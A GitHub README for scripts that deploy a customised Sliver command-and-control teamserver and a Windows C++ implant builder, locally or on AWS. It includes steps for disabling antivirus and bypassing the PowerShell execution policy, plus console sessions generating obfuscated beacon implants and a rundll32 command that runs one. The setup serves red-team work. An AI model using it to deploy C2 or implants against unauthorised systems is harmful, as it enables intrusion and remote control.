# sliver-deployment

This repo contains automation scripts in order to deploy my own branch (**branch refactor/teamserver-interaction**) of sliver having P2P communications over beacons, along with a builder (**branch cppimplant** able to build C++ sliver implants for windows platform. Source code available of C++ implants is available here: https://github.com/MrAle98/Sliver-CPPImplant2. Probably can teach how to **NOT** write software in C++. The implant code is compatible only with the branch **refactor/teamserver-interaction** as It changes the way the implant interacts with the server in order to support P2P communications over beacons.

This repository deploys both a **sliver teamserver** and a **builder of C++ implants for the windows machine**. The **teamserver** is deployed on **linux machine**, the **builder** is deployed on a **windows machine**.

## Requirements

Requires to install locally:
* **ansible**
* [**pywinrm**](https://docs.ansible.com/ansible/latest/os_guide/windows_winrm.html) so that ansible con communicate with the windows VM over WinRM
* **go1.19.1**

Additional requirements to install on aws:
* **terraform** 
* **awscli**


Be sure that when you run go on your machine the symbolic link is pointing to go1.19.1.
```
┌──(kali㉿kali)-[/usr/bin]
└─$ ls -la go
lrwxrwxrwx 1 root root 26 13 ago 16.19 go -> /home/kali/go/bin/go1.19.1

┌──(kali㉿kali)-[/usr/bin]
└─$
```

## Deploy all locally

Here instructions about how to deploy the **teamserver** on a **local kali VM** and the **builder** on a **local windows VM**.

1. Clone repo with all submodules on kali VM.
```
$ git clone --recursive https://github.com/MrAle98/sliver-awsdeployment.git
```
2. disable AV on windows VM.
3. copy setup_local.ps1 on windows VM. Change username and password variable inside the script to be whatever you like. Default are `ansibleUser:ansiblePass`. Run the script (as administrator).

```
PS > powershell -ep bypass
PS > .\setup_local.ps1
[...]
You need to restart this machine prior to using choco.
Ensuring Chocolatey commands are on the path
Ensuring chocolatey.nupkg is in the lib folder
PS >
```

4. Restart the VM. After the VM restarts be sure AV is completely disabled.

5. Run build-servers.sh.

```
$ ./build-servers.sh
[...]
GOOS=windows CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ go build -mod=vendor -trimpath -tags osusergo,netgo,cgosqlite,sqlite_omit_load_extension,client -ldflags "-s -w -X github.com/bishopfox/sliver/client/version.Version=v1.5.22 -X \"github.com/bishopfox/sliver/client/version.GoVersion=go version go1.19.1 linux/amd64\" -X github.com/bishopfox/sliver/client/version.CompiledAt=1723566051 -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=https://api.github.com/repos/BishopFox/sliver/releases -X github.com/bishopfox/sliver/client/version.GitCommit=2772f8897de1a6cb7e37eb7ad9b529ac81dc8de5 -X github.com/bishopfox/sliver/client/version.GitDirty= -X github.com/bishopfox/sliver/client/assets.DefaultArmoryPublicKey=RWSBpxpRWDrD7Fe+VvRE3c2VEDC2NK80rlNCj+BX0gz44Xw07r6KQD9L -X github.com/bishopfox/sliver/client/assets.DefaultArmoryRepoURL=https://api.github.com/repos/sliverarmory/armory/releases" -o sliver-client.exe ./client
$ 
```

6. Update ./ansible_configs/inventory/win_inventory.yml with ip of your windows VM and username and password you set before.
```
[sliverbuilder]
192.168.119.132

[sliverbuilder:vars]
ansible_connection=winrm
ansible_user=ansibleUser
ansible_password=ansiblePass
ansible_winrm_server_cert_validation=ignore
```

7. Start sliver-server locally. Start multiplayer mode and create two operators: one is the builder the other one a normal operator.
```
└─$ ~/sliver-builds/sliver-server
[*] Loaded 16 aliases from disk
[*] Loaded 69 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain cipher
[*] Server v1.5.22 - 1230ffeda7ec994d56e1ed0036b00b50508ca7d8
[*] Welcome to the sliver shell, please type 'help' for options

[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[server] sliver > new-operator -l 192.168.161.50 -n winbuilder

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/kali/sliver-builds/winbuilder_192.168.161.50.cfg

[server] sliver > new-operator -n ale98 -l 127.0.0.1

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/kali/sliver-builds/ale98_127.0.0.1.cfg

[*] ale98 has joined the game

[server] sliver > operators

 Name         Status
============ =========
 winbuilder   Offline
 ale98        Offline

[server] sliver >
```

8. Move winbuilder_192.168.161.50.cfg under ansible_configs with name builder.cfg
```
$ mv winbuilder_192.168.161.50.cfg /path/to/ansible_configs/builder.cfg
```

9. run ansible playbook win-playbook_local.yml (It will take 1 hour or more). 
```
$ cd ansible_configs/
$ ansible-playbook -i inventory/win_inventory.yml win-playbook_local.yml
```

Now start a sliver-client on your kali machine and notice the builder was registered successfully and you can generate exe, dll, dotnet, powershell implants. Be careful to spawn HTTP/HTTPS listeners always with the `-D` option as the C++ implant do not provide full support for OTPs.

```
sliver > http -D
[...]
sliver > generate beacon --http http://192.168.161.50 -E -f dotnet

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
 ⠹  External build acknowledged by builder (template: sliver) ... 1m32s
sliver > builders

 Name              Operator     Templates   Platform        Compiler Targets
================= ============ =========== =============== ==========================
 DESKTOP-H8C0U5U   winbuilder   sliver      windows/amd64   EXECUTABLE:windows/amd64
                                                            DOTNET:windows/amd64
                                                            POWERSHELL:windows/amd64
                                                            SHARED_LIB:windows/amd64
                                                            SERVICE:windows/386
                                                            SERVICE:windows/amd64
                                                            SHELLCODE:windows/386
                                                            SHELLCODE:windows/amd64

sliver > generate beacon --http http://192.168.161.50 -E -f dotnet

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 2m1s
[*] Build name: PRACTICAL_PIANO (9650688 bytes)
[*] Implant saved to /home/kali/sliver-builds/a.exe

sliver > generate beacon --http http://192.168.161.50 -E -f powershell

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 1m38s
[*] Build name: OPTIMISTIC_LAUNDRY (12872831 bytes)
[*] Implant saved to /home/kali/sliver-builds/a.ps1

sliver > generate beacon --http http://192.168.161.50 -E -f exe

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 1m18s
[*] Build name: STRAIGHT_DEPLOYMENT (3352576 bytes)
[*] Implant saved to /home/kali/sliver-builds/STRAIGHT_DEPLOYMENT.exe

sliver > generate beacon --http http://192.168.161.50 -E -f shared

[*] Using external builder: DESKTOP-H8C0U5U
[*] Externally generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Creating external build ... done
[*] Build completed in 1m16s
[*] Build name: LEGAL_LENGTH (3431424 bytes)
[*] Implant saved to /home/kali/sliver-builds/LEGAL_LENGTH.dll

sliver >
```

Dll entrypoint is **Entry**.

```
> rundll32.exe LEGAL_LENGTH.dll,Entry
```

## Deploy all on aws

**Create ssh key on AWS** and take note of a **subnet id** of your **default VPC**. In addition take note of the **ip address range** of your subnet. 

1. change **private key name** in **variables.tf**. Change **path to private key** (.pem file) in **decrypt_pass.sh**. Change **path to private key** (.pem file) in **run_linuxplaybook.sh**. Set username and password variables inside **variables.tf**. Set same username and password variables inside **ansible_configs/inventory/win_inventory.yml**. Set **whitelist_cidr_home** and **whitelist_cidr_office** to ip ranges allowed to reach your machines in **variables.tf**. Change the ip **172.31.0.5** with an ip in the address range of your subnet inside **linux-playbook.yml**. 
2. run terraform.
```
$ terraform init
$ terraform validate
$ terraform apply
var.instance_password                                                                               
  Enter a value: <set your password>                                                              
                                                  
var.whitelist_cidr_home                                                                             
  Enter a value: <set home_ip_address/32 allowed to access machines>                                                                     
                                                  
var.whitelist_cidr_office                         
  Enter a value: <set office_ip_address/number allowed to access machines> 
[...]
Apply complete! Resources: 2 added, 0 changed, 1 destroyed.

Outputs:

Administrator_Password = "[base64]"
sliver-server_ip = "3.77.146.66"
windows-sliver-builder_ip = "3.68.68.55"
$ 
```

3. decrypt Administrator_Password (in case you need it)
```
$ ./decrypt_pass.sh <base64 Administrator_Password>
The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
[your password] 
$
```
4. Update ./ansible_configs/inventory/win_inventory.yml with ip of the windows VM on AWS (windows-sliver-builder_ip).
```
[sliverbuilder]
3.68.68.55

[sliverbuilder:vars]
ansible_connection=winrm
ansible_user=<username in variables.tf>
ansible_password="<password in variables.tf>"
ansible_winrm_server_cert_validation=ignore
```
5. run linuxplaybook passing as input linux VM ip in aws (sliver-server_ip).
```
$ ./run-linuxplaybook.sh 3.77.146.66
[...]
changed: [3.77.146.66]
 ____________
< PLAY RECAP >
 ------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

3.77.146.66                : ok=17   changed=15   unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
$
```




```
┌──(kali㉿kali)-[~/temp/sliver-awsdeployment/ansible_configs]
└─$ cp builder_aws.cfg sliver/builder.cfg

┌──(kali㉿kali)-[~/temp/sliver-awsdeployment/ansible_configs]
└─$ ~/sliver-builds/sliver-client import operator.cfg
2024/08/14 11:45:10 Saved new client config to: /home/kali/.sliver-client/configs/operator_3.77.146.66.cfg

┌──(kali㉿kali)-[~/temp/sliver-awsdeployment/ansible_configs]
└─$
```

## Notes

powershell and dotnet formats rely on inceptor and MemoryModulePP projects.

## Acknowledgements

* [Alessandro Magnosi](https://twitter.com/KlezVirus) for inceptor
* [@bb107](https://github.com/bb107) for MemoryModulePP
* [Joe DeMesy](https://github.com/moloch--) [Ronan Kervella](https://github.com/rkervella) [BishopFox](https://github.com/BishopFox) for sliver of course
